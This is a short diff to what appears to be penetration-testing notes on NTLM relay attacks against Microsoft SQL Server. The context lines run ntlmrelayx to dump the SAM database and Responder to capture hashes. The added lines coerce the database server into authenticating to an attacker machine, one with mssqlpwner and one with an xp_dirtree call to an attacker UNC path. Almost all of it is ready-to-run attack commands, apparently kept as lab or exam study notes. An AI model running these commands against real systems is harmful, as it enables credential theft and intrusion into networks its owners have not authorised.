@@ -201,6 +201,8 @@ SAM Dump: `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`
 
 Fire up responder: `sudo responder -I tun0` (make sure SMB is turned OFF in /etc/responder/Responder.conf)
 
-Perform the attack: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>`
+Trigger authentication mssqlpwner: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>`
+
+Trigger authentication impacket: `xp_dirtree \\192.168.45.196\blabla`
 
 
